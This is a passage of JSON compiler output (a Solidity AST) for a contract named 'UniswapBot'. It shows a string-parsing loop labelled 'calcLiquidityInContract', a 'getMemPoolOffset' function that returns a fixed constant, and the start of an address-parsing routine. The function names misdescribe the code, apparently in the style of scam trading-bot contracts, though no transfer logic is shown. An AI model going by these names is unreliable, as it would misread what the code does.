																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1223,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1222,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1219,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1212,
															"src": "7841:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1220,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 615,
														"src": "7841:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3331",
														"id": 1221,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7853:2:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_31_by_1",
															"typeString": "int_const 31"
														},
														"value": "31"
													},
													"src": "7841:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7830:25:9"
											},
											{
												"assignments": [
													1225
												],
												"declarations": [
													{
														"constant": false,
														"id": 1225,
														"mutability": "mutable",
														"name": "end",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1297,
														"src": "7866:8:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1224,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7866:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1230,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1229,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1226,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1218,
														"src": "7877:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1227,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1212,
															"src": "7883:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1228,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "7883:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7877:15:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7866:26:9"
											},
											{
												"body": {
													"id": 1295,
													"nodeType": "Block",
													"src": "7931:455:9",
													"statements": [
														{
															"assignments": [
																1242
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 1242,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 1295,
																	"src": "7946:7:9",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"typeName": {
																		"id": 1241,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "7946:5:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 1243,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "7946:7:9"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "7977:30:9",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "7979:26:9",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "ptr",
																							"nodeType": "YulIdentifier",
																							"src": "7994:3:9"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "7988:5:9"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "7988:10:9"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "8000:4:9",
																					"type": "",
																					"value": "0xFF"
																				}
																			],
																			"functionName": {
																				"name": "and",
																				"nodeType": "YulIdentifier",
																				"src": "7984:3:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "7984:21:9"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "7979:1:9"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 1242,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7979:1:9",
																	"valueSize": 1
																},
																{
																	"declaration": 1218,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7994:3:9",
																	"valueSize": 1
																}
															],
															"id": 1244,
															"nodeType": "InlineAssembly",
															"src": "7968:39:9"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																},
																"id": 1247,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1245,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1242,
																	"src": "8025:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 1246,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8029:4:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "8025:8:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"id": 1255,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 1253,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1242,
																		"src": "8087:1:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "<",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784530",
																		"id": 1254,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "8091:4:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_224_by_1",
																			"typeString": "int_const 224"
																		},
																		"value": "0xE0"
																	},
																	"src": "8087:8:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 1263,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1261,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1242,
																			"src": "8149:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30784630",
																			"id": 1262,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "8153:4:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_240_by_1",
																				"typeString": "int_const 240"
																			},
																			"value": "0xF0"
																		},
																		"src": "8149:8:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": {
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 1271,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1269,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1242,
																				"src": "8211:1:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30784638",
																				"id": 1270,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8215:4:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_248_by_1",
																					"typeString": "int_const 248"
																				},
																				"value": "0xF8"
																			},
																			"src": "8211:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": {
																			"condition": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 1279,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1277,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1242,
																					"src": "8273:1:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30784643",
																					"id": 1278,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8277:4:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_252_by_1",
																						"typeString": "int_const 252"
																					},
																					"value": "0xFC"
																				},
																				"src": "8273:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			},
																			"falseBody": {
																				"id": 1289,
																				"nodeType": "Block",
																				"src": "8332:43:9",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 1287,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 1285,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1218,
																								"src": "8351:3:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "36",
																								"id": 1286,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8358:1:9",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_6_by_1",
																									"typeString": "int_const 6"
																								},
																								"value": "6"
																							},
																							"src": "8351:8:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1288,
																						"nodeType": "ExpressionStatement",
																						"src": "8351:8:9"
																					}
																				]
																			},
																			"id": 1290,
																			"nodeType": "IfStatement",
																			"src": "8270:105:9",
																			"trueBody": {
																				"id": 1284,
																				"nodeType": "Block",
																				"src": "8283:43:9",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 1282,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 1280,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1218,
																								"src": "8302:3:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "35",
																								"id": 1281,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8309:1:9",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_5_by_1",
																									"typeString": "int_const 5"
																								},
																								"value": "5"
																							},
																							"src": "8302:8:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1283,
																						"nodeType": "ExpressionStatement",
																						"src": "8302:8:9"
																					}
																				]
																			}
																		},
																		"id": 1291,
																		"nodeType": "IfStatement",
																		"src": "8208:167:9",
																		"trueBody": {
																			"id": 1276,
																			"nodeType": "Block",
																			"src": "8221:43:9",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1274,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 1272,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1218,
																							"src": "8240:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "34",
																							"id": 1273,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8247:1:9",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_4_by_1",
																								"typeString": "int_const 4"
																							},
																							"value": "4"
																						},
																						"src": "8240:8:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1275,
																					"nodeType": "ExpressionStatement",
																					"src": "8240:8:9"
																				}
																			]
																		}
																	},
																	"id": 1292,
																	"nodeType": "IfStatement",
																	"src": "8146:229:9",
																	"trueBody": {
																		"id": 1268,
																		"nodeType": "Block",
																		"src": "8159:43:9",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 1266,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 1264,
																						"name": "ptr",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1218,
																						"src": "8178:3:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "+=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "33",
																						"id": 1265,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8185:1:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_3_by_1",
																							"typeString": "int_const 3"
																						},
																						"value": "3"
																					},
																					"src": "8178:8:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 1267,
																				"nodeType": "ExpressionStatement",
																				"src": "8178:8:9"
																			}
																		]
																	}
																},
																"id": 1293,
																"nodeType": "IfStatement",
																"src": "8084:291:9",
																"trueBody": {
																	"id": 1260,
																	"nodeType": "Block",
																	"src": "8097:43:9",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 1258,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1256,
																					"name": "ptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1218,
																					"src": "8116:3:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "+=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 1257,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8123:1:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "8116:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1259,
																			"nodeType": "ExpressionStatement",
																			"src": "8116:8:9"
																		}
																	]
																}
															},
															"id": 1294,
															"nodeType": "IfStatement",
															"src": "8021:354:9",
															"trueBody": {
																"id": 1252,
																"nodeType": "Block",
																"src": "8035:43:9",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1250,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 1248,
																				"name": "ptr",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1218,
																				"src": "8054:3:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "+=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 1249,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8061:1:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"src": "8054:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1251,
																		"nodeType": "ExpressionStatement",
																		"src": "8054:8:9"
																	}
																]
															}
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1237,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1235,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1218,
														"src": "7915:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1236,
														"name": "end",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1225,
														"src": "7921:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7915:9:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1296,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1233,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1231,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1215,
															"src": "7908:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1232,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7912:1:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "7908:5:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1234,
													"nodeType": "ExpressionStatement",
													"src": "7908:5:9"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1239,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7926:3:9",
														"subExpression": {
															"argumentTypes": null,
															"id": 1238,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1215,
															"src": "7926:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1240,
													"nodeType": "ExpressionStatement",
													"src": "7926:3:9"
												},
												"nodeType": "ForStatement",
												"src": "7903:483:9"
											}
										]
									},
									"documentation": null,
									"id": 1298,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "calcLiquidityInContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1213,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1212,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1298,
												"src": "7769:17:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1211,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "7769:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7768:19:9"
									},
									"returnParameters": {
										"id": 1216,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1215,
												"mutability": "mutable",
												"name": "l",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1298,
												"src": "7811:6:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1214,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7811:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7810:8:9"
									},
									"scope": 2159,
									"src": "7736:657:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1305,
										"nodeType": "Block",
										"src": "8459:35:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "313934393736323635",
													"id": 1303,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8477:9:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_194976265_by_1",
														"typeString": "int_const 194976265"
													},
													"value": "194976265"
												},
												"functionReturnParameters": 1302,
												"id": 1304,
												"nodeType": "Return",
												"src": "8470:16:9"
											}
										]
									},
									"documentation": null,
									"id": 1306,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolOffset",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1299,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8427:2:9"
									},
									"returnParameters": {
										"id": 1302,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1301,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1306,
												"src": "8453:4:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1300,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "8453:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8452:6:9"
									},
									"scope": 2159,
									"src": "8402:92:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1481,
										"nodeType": "Block",
										"src": "8746:860:9",
										"statements": [
											{
												"assignments": [
													1314
												],
												"declarations": [
													{
														"constant": false,
														"id": 1314,
														"mutability": "mutable",
														"name": "tmp",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1481,
														"src": "8757:16:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1313,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8757:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1319,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1317,
															"name": "_a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1308,
															"src": "8782:2:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1316,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "8776:5:9",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1315,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8776:5:9",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1318,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8776:9:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8757:28:9"
											},
											{
												"assignments": [
													1321
												],
												"declarations": [
													{
														"constant": false,
														"id": 1321,
														"mutability": "mutable",
														"name": "iaddr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1481,
														"src": "8796:13:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 1320,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8796:7:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1323,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 1322,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8812:1:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8796:17:9"
											},
											{
												"assignments": [
													1325
												],
												"declarations": [
													{
														"constant": false,
														"id": 1325,
